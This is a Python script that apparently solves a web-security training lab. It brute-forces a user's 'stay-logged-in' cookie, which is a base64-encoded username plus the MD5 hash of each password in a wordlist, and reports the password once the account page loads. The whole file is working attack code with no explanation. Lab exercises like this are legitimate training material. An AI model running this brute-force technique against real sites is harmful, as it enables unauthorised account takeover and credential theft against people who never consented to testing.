import requests
import base64
import sys
import urllib3
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def bruteforce_password_hash(s, url):
    carlos_acc_url = url + '/my-account?id=carlos'
    passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
    for password in passwords:
        pass_md5 = hashlib.md5(password.encode()).hexdigest()
        bytes_str = ('carlos:' + pass_md5).encode('utf-8')
        stay_cookie = base64.b64encode(bytes_str).decode('utf-8')

        print(password, stay_cookie)

        cookies = { 'stay-logged-in': stay_cookie }
        r = s.get(carlos_acc_url, headers=headers, cookies=cookies, allow_redirects=False)
        
        if r.status_code == 200 and 'Log out' in r.text:
            print('[+] Successful bruteforce carlos stay-logged-in cookie')
            print(f'stay-logged-in: {stay_cookie}')
            print(f'Password: {password}')
            sys.exit()

    print('[-] Don\'t find Carlos password in the list')
    sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    bruteforce_password_hash(s, url)

if __name__ == '__main__':
    main()